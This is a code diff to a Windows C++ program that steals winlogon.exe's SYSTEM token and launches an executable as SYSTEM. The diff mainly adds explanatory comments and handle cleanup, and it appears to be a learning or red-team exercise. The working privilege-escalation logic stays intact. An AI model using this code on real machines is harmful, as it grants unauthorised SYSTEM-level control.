@@ -2,7 +2,7 @@
 
 int wmain(int argc, wchar_t** argv)
 {
-	// open a handle to winlogon.exe 
+	// open a handle to winlogon.exe (assign the HANDLE to a RAII type - defined in raii.h - so that CloseHandle is always called)
 	RAII::Handle winlogonHandle(::OpenProcess(PROCESS_ALL_ACCESS, false, FindPid(L"winlogon.exe")));
 	if (winlogonHandle.GetHandle() == NULL)
 	{
@@ -15,7 +15,7 @@ int wmain(int argc, wchar_t** argv)
 	// open a handle to winlogon's token
 	HANDLE systemToken;
 	BOOL success = ::OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_DUPLICATE, &systemToken);
-	RAII::Handle hSystemToken(systemToken);
+	RAII::Handle hSystemToken(systemToken); // assigning the HANDLE obtained through OpenProcessToken() to a RAII type
 	if (!success)
 	{
 		std::cout << "[-] Could not get SYSTEM token. " << std::endl;
@@ -45,19 +45,19 @@ int wmain(int argc, wchar_t** argv)
 	else std::cout << "[+] SYSTEM token successfully duplicated!" << std::endl;
 
 	// spawn taskmgr.exe using the newly duplicated SYSTEM token
-	STARTUPINFO si = { sizeof(si) };
-	PROCESS_INFORMATION pi;
+	STARTUPINFO si = { sizeof(si) }; // startup info structure, used to specify custom configurations for the process
+	PROCESS_INFORMATION pi; // process information structure that will hold HANDLEs to the child process/thread
 	success = ::CreateProcessWithTokenW
 	(
-		hNewSystemToken.GetHandle(),
+		hNewSystemToken.GetHandle(), // get the handle to the duplicated SYSTEM token
 		NULL,
-		argv[1],
-		nullptr,
+		argv[1], // executable name/path
+		nullptr, // arguments to the executable (we don't have them)
 		NULL,
 		nullptr,
 		nullptr,
-		&si,
-		&pi
+		&si, 
+		&pi 
 	);
 	if (!success)
 	{
@@ -66,6 +66,10 @@ int wmain(int argc, wchar_t** argv)
 		return 1;
 	}
 	else std::wcout << L"[+] Spawned " << argv[1] << L" running as SYSTEM!" << std::endl;
+	
+	// close the HANDLEs obtained with CreateProcessWithTokenW() which were not assigned to a RAII type variable
+	::CloseHandle(pi.hProcess);
+	::CloseHandle(pi.hThread);
 
 	return 0;
 }
